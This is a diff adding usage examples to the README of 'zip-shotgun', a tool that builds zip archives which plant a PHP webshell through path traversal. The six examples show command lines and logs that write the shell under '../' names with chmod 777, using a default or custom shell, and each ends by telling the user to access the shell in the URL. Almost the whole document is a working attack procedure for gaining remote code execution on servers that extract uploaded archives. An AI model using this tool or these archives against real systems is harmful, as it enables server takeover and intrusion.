@@ -55,4 +55,144 @@ Options:
 
 ### Examples
 
-TODO
+1. Using all default options
+
+    ```zip-shotgun archive.zip```
+    
+    Part of the script output
+    
+    ```
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Opening output zip file: REDACTEDs\zip-shotgun\archive.zip
+    12/Dec/2018 Wed 23:13:13 +0100 |  WARNING | Shell name was not provided. Generated random shell name: BCsQOkiN23ur7OUj
+    12/Dec/2018 Wed 23:13:13 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | --compress flag was NOT set. Archive will be uncompressed. Files will be only stored.
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Writing file to the archive: BCsQOkiN23ur7OUj.php
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: BCsQOkiN23ur7OUj.php
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Writing file to the archive: ../BCsQOkiN23ur7OUj.php
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../BCsQOkiN23ur7OUj.php
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Writing file to the archive: ../../BCsQOkiN23ur7OUj.php
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../BCsQOkiN23ur7OUj.php
+    ...
+    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Finished. Try to access shell using BCsQOkiN23ur7OUj.php in the URL
+    ```
+
+2. Using default options and enabling compression for archive file
+
+    ```zip-shotgun --compress archive.zip```
+    
+    Part of the script output
+    
+    ```
+    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | Opening output zip file: REDACTEDs\zip-shotgun\archive.zip
+    12/Dec/2018 Wed 23:16:13 +0100 |  WARNING | Shell name was not provided. Generated random shell name: 6B6NtnZXbXSubDCh
+    12/Dec/2018 Wed 23:16:13 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
+    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
+    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | --compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9
+    ...
+    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | Finished. Try to access shell using 6B6NtnZXbXSubDCh.php in the URL
+    ```
+
+3. Using default options but changing the number of directories to go back in the archive to 3
+
+    ```zip-shotgun --directories-count 3 archive.zip```
+    
+    ```zip-shotgun -c 3 archive.zip```
+    
+    The script will write 3 files in total to the archive
+    
+    Part of the script output
+    
+    ```
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
+    12/Dec/2018 Wed 23:17:43 +0100 |  WARNING | Shell name was not provided. Generated random shell name: 34Bv9YoignMHgk2F
+    12/Dec/2018 Wed 23:17:43 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | --compress flag was NOT set. Archive will be uncompressed. Files will be only stored.
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Writing file to the archive: 34Bv9YoignMHgk2F.php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: 34Bv9YoignMHgk2F.php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Writing file to the archive: ../34Bv9YoignMHgk2F.php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../34Bv9YoignMHgk2F.php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Writing file to the archive: ../../34Bv9YoignMHgk2F.php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../34Bv9YoignMHgk2F.php
+    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Finished. Try to access shell using 34Bv9YoignMHgk2F.php in the URL
+    ```
+
+4. Using default options but providing shell name inside archive and enabling compression
+
+    Shell name cannot have whitespaces
+    
+    ```zip-shotgun --shell-name custom-name --compress archive.zip```
+    
+    ```zip-shotgun -n custom-name --compress archive.zip```
+    
+    Name for shell files inside the archive will be set to the one provided by user.
+    
+    Part of the script output
+    
+    ```
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
+    12/Dec/2018 Wed 23:19:12 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | --compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: custom-name.php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: custom-name.php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: ../custom-name.php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../custom-name.php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: ../../custom-name.php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../custom-name.php
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: ../../../custom-name.php
+    ...
+    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Finished. Try to access shell using custom-name.php in the URL
+    ```
+
+5. Provide custom shell file but use random name inside archive. Set directories count to 3
+
+    ```zip-shotgun --directories-count 3 --shell-file-path ./custom-shell.php archive.zip```
+    
+    ```zip-shotgun -c 3  -f ./custom-shell.php archive.zip```
+    
+    Shell code will be extracted from user provided file. Names inside the archive will be randomly generated.
+    
+    Part of the script output
+    
+    ```
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
+    12/Dec/2018 Wed 23:21:37 +0100 |  WARNING | Shell name was not provided. Generated random shell name: gqXRAJu1LD8d8VKf
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | File containing shell code was provided: REDACTED\zip-shotgun\custom-shell.php. Content will be added to archive
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Getting file extension from provided shell file for reuse: php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Opening provided file with shell code: REDACTED\zip-shotgun\custom-shell.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | --compress flag was NOT set. Archive will be uncompressed. Files will be only stored.
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Writing file to the archive: gqXRAJu1LD8d8VKf.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: gqXRAJu1LD8d8VKf.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Writing file to the archive: ../gqXRAJu1LD8d8VKf.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../gqXRAJu1LD8d8VKf.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Writing file to the archive: ../../gqXRAJu1LD8d8VKf.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../gqXRAJu1LD8d8VKf.php
+    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Finished. Try to access shell using gqXRAJu1LD8d8VKf.php in the URL
+    ```
+    
+6. Provide custom shell file and set shell name to save inside archive. Set directories count to 3 and use compression
+
+    ```zip-shotgun --directories-count 3 --shell-name custom-name --shell-file-path ./custom-shell.php --compress archive.zip```
+    
+    ```zip-shotgun -c 3 -n custom-name -f ./custom-shell.php --compress archive.zip```
+    
+    Shell code will be extracted from user provided file. Names inside the archive will be set to user provided name.
+    
+    Part of the script output
+    
+    ```
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | File containing shell code was provided: REDACTED\zip-shotgun\custom-shell.php. Content will be added to archive
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Getting file extension from provided shell file for reuse: php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Opening provided file with shell code: REDACTED\zip-shotgun\custom-shell.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | --compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Writing file to the archive: custom-name.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: custom-name.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Writing file to the archive: ../custom-name.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../custom-name.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Writing file to the archive: ../../custom-name.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../custom-name.php
+    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Finished. Try to access shell using custom-name.php in the URL
+    ```
